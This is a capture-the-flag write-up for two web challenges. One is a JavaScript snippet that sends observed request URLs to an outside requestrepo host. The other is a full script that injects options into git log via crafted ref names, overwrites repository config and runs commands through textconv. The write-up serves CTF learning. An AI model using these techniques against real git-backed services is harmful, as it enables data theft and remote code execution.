Write-up for [ASIS CTF Finals 2024](https://ctftime.org/event/2403) â€” Web challenges fetch-box and gitmails.

<Excerpt />

## fetch-box (19 solves)

Use `PerformanceObserver` to observe `fetch` requests:

```javascript
new PerformanceObserver((list) => {
    list.getEntries().forEach((entry) => {
        if (entry.name.includes('/ping?')) {
            location = 'https://*.requestrepo.com/' + entry.name;
        }
    });
}).observe({entryTypes: ['resource']});
```

BTW, service worker does not work because it's not HTTPS.

## gitmails (5 solves)

### `git log` option injection

```python
            emails = check_output(
                ['git', 'log', '--pretty=format:%ae', 
                *([f'--author={author}'] if author else []),
                branch],
                cwd=repo_dir
```

Here the `branch` is supposed to be a branch, but it will be an option if it starts with `-`.

The `git` CLI does not allow such branch names, but we can modify the refs directly. For example:

```bash
cp .git/refs/heads/master .git/refs/heads/--output=config
```

### `git log --output` for file writing

We can use `git log --output` to write the log to arbitrary file. Find this in `man git log` or [git | GTFOArgs](https://gtfoargs.github.io/gtfoargs/git/).

As `--pretty=format:%ae` is set, we can use the email of each commit for each line in the output, e.g.:

```bash
GIT_AUTHOR_EMAIL="pager = /readflag" git commit --allow-empty -m nothing
GIT_AUTHOR_EMAIL='[core]' git commit --allow-empty -m nothing
```

### Approaches that do not work

-   `core.fsmonitor`: Does not work in bare repository.
-   `core.pager`: The output pipes into the `check_output` function without an interactive tty, so Git does not use a pager.
-   `core.alternateRefsCommand`: Need a known path to an `objects` directory that is not the current repository.
-   `diff.external` / `diff.<driver>.command`: Need both `-p` and `--ext-diff` but we can only inject a single option.

### `textconv` for command execution

`diff.<driver>.textconv` can be used to execute arbitrary command with `git log -p`.

The `textconv` command is called as `<cmd> <filename>`, so we can use `textconv = /readflag '--give-me-the-f|ag' | tee` to output the flag.

We need to set the diff driver in the `info/attributes` file, such as `* [diff=flag]` and `[diff "flag"] textconv = /readflag`.

However, we only have a single commit log (the branch argument is used as an option instead), so we will have identical `config` and `info/attributes`, but they have different syntax and contents.

The `config` needs to be completely valid, while `attributes` may have syntax errors. So we can append `a= diff=flag` to `config`, which is the attribute we need and also a valid line in `config`. Then add a file with name `a=` in the repository to see the diff.

### Hosting the repository

If we don't want to use a public service like GitHub, we should host the repository to support read-only HTTP clone.

It's actually super easy. Just run `git --bare update-server-info` in the `.git` directory and run an HTTP server.

### Final script

```bash
#!/bin/bash

set -euo pipefail

mkdir exp
cd exp
git init

touch a=
git add .
GIT_AUTHOR_EMAIL='a= diff=flag' git commit -m nothing
GIT_AUTHOR_EMAIL="textconv = /readflag '--give-me-the-f|ag' | tee" git commit --allow-empty -m nothing
GIT_AUTHOR_EMAIL='[diff "flag"]' git commit --allow-empty -m nothing

cd .git
cp refs/heads/master refs/heads/--output=config
mkdir refs/heads/--output=info
cp refs/heads/master refs/heads/--output=info/attributes
cp refs/heads/master refs/heads/-p

git --bare update-server-info
python -m http.server 1337
```

Then ask the challenge server to clone your HTTP git server.
